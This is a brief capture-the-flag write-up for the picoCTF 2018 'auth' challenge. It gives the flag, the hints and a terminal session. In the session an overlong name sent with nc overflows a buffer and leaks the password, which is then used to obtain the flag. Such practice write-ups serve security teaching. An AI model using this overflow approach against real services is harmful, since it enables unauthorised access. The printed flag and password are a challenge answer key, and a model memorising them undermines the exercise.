:checkered_flag: picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}

## Solve
Can you authenticate to this [service](https://2018shell.picoctf.com/static/0bb8663a6d82ba0c5d07f06e357c22ca/auth) and get the flag? Connect with `nc 2018shell.picoctf.com 31045`. [Source](https://2018shell.picoctf.com/static/0bb8663a6d82ba0c5d07f06e357c22ca/auth.c).

## Hints
Are all the system calls being used safely?  
Some people can have reallllllly long names you know..

## Solution
```
root@kali:~/Downloads# seq -s "" 112 | nc 2018shell.picoctf.com 31045
What is your name?
Hello 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112,
Please Enter the Password.a_reAllY_s3cuRe_p4s$word_d98e8d

Incorrect Password!
root@kali:~/Downloads# nc 2018shell.picoctf.com 31045
What is your name?
user
Hello user,
Please Enter the Password.
a_reAllY_s3cuRe_p4s$word_d98e8d
picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}
```
